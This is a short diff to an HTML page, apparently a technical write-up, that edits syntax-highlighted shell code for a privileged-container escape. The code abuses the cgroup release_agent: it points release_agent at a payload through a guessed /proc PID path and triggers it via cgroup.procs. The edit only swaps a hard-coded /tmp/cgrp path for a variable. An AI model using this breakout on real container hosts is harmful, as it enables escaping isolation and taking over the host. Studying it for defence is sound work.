@@ -330,7 +330,7 @@ mount <span class="nt">-t</span> cgroup <span class="nt">-o</span> memory cgroup
     <span class="k">fi
   fi</span>
   <span class="c"># Set the release_agent path to the guessed pid</span>
-  <span class="nb">echo</span> <span class="s2">"/proc/</span><span class="k">${</span><span class="nv">TPID</span><span class="k">}</span><span class="s2">/root</span><span class="k">${</span><span class="nv">PAYLOAD_PATH</span><span class="k">}</span><span class="s2">"</span> <span class="o">&gt;</span> /tmp/cgrp/release_agent
+  <span class="nb">echo</span> <span class="s2">"/proc/</span><span class="k">${</span><span class="nv">TPID</span><span class="k">}</span><span class="s2">/root</span><span class="k">${</span><span class="nv">PAYLOAD_PATH</span><span class="k">}</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="k">${</span><span class="nv">CGROUP_MOUNT</span><span class="k">}</span>/release_agent
   <span class="c"># Trigger execution of the release_agent</span>
   sh <span class="nt">-c</span> <span class="s2">"echo </span><span class="se">\$\$</span><span class="s2"> &gt; </span><span class="k">${</span><span class="nv">CGROUP_MOUNT</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">CGROUP_NAME</span><span class="k">}</span><span class="s2">/cgroup.procs"</span>
   <span class="nv">TPID</span><span class="o">=</span><span class="k">$((${</span><span class="nv">TPID</span><span class="k">}</span> <span class="o">+</span> <span class="m">1</span><span class="k">))</span>
